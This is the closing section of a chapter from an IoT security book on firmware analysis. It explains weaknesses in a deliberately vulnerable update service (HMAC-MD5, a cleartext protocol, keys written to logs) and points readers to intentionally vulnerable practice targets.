<p class="BodyFirst">The server and client rely on HMAC-MD5 for calculating a cryptographic hash the client uses to validate the firmware file’s integrity. Although the MD5 message-digest algorithm is now considered a broken and risky cryptographic hash function, HMAC-MD5 doesn’t suffer from the same weaknesses. HMAC is a keyed-hash message authentication code that uses a cryptographic hash function (in this case, MD5) and a secret cryptographic key (the preshared key in our example). As of today, HMAC-MD5 has not been proven to be vulnerable to the practical collision attacks that MD5 has. Nevertheless, current security best practices suggest that HMAC-MD5 shouldn’t be included in future cipher suites. </p>
<h4 id="h3-500907c09-0008">Unencrypted Communication Channels</h4>
<p class="BodyFirst">A high-risk vulnerability for the update service is the use of an unencrypted communication channel. The client and server exchange information using a custom cleartext protocol over TCP. This means that if attackers attain a man-in-the-middle position on the network, they could capture and read the transmitted data. This includes the firmware file and the key used for authenticating against the server (<a href="#figure9-6" id="figureanchor9-6">Figure 9-6</a>). In addition, because the HMAC-MD5 relies on the same cryptographic key, the attacker could maliciously alter the firmware in transit and plant backdoors in it.  </p>
<p>You can read more about this vulnerability at <a href="https://cwe.mitre.org/data/definitions/319.html" class="LinkURL">https://cwe.mitre.org/data/definitions/319.html</a>.</p>
<h4 id="h3-500907c09-0009">Sensitive Log Files</h4>
<p class="BodyFirst">Last but not least, the client’s logging mechanism includes sensitive information (the <code>KEY</code> value) in log files (in this case, the <em>/var/log/messages</em>). We showed the exact spot this occurred when walking through the client source code. This is a generally insecure practice, because log files typically have insecure file permissions (often, they’re readable by everyone). In many cases, the log output appears in less secure areas of the IoT system, such as in a web interface that doesn’t require admin privileges or a mobile app’s debugging output. </p>
<span epub:type="pagebreak" title="235" id="Page_235"/><figure>
<img src="Images/f09006.png" alt="f09006" width="754" height="345"/>
<figcaption><p><a id="figure9-6">Figure 9-6:</a> A Wireshark screenshot showing the transmission of sensitive information (an authentication key) over an unencrypted TCP protocol</p></figcaption>
</figure>
<h2 id="h1-500907c09-0006">Conclusion</h2>
<p class="BodyFirst">In this chapter, we explored firmware reverse engineering and research. Every device has a firmware, and even though analyzing it looks intimidating at first, you can easily learn to do it by practicing the techniques in this chapter. Firmware hacking can extend your offensive security capabilities and is a great skill for your tool set. </p>
<p>Here, you learned the different ways of obtaining and extracting firmware. You emulated a single binary and the whole firmware and loaded a vulnerable firmware to a device. Then you researched and identified vulnerabilities on an intentionally vulnerable firmware service.</p>
<p>To continue practicing targeting a vulnerable firmware, try the OWASP IoTGoat (<a href="https://github.com/OWASP/IoTGoat/" class="LinkURL">https://github.com/OWASP/IoTGoat/</a>), a deliberately insecure firmware based on OpenWrt and maintained by OWASP. Or try the Damn Vulnerable ARM Router (DVAR), an emulated Linux-based ARM router that runs a vulnerable web server (<a href="https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html" class="LinkURL">https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html</a>). Those of you who want to try your skills on a low-cost ($17) physical device can try the Damn Vulnerable IoT Device (DVID). It’s an open source, vulnerably designed IoT device that you can build upon a cheap Atmega328p microcontroller and an OLED screen.</p>
</section>
</div></body></html>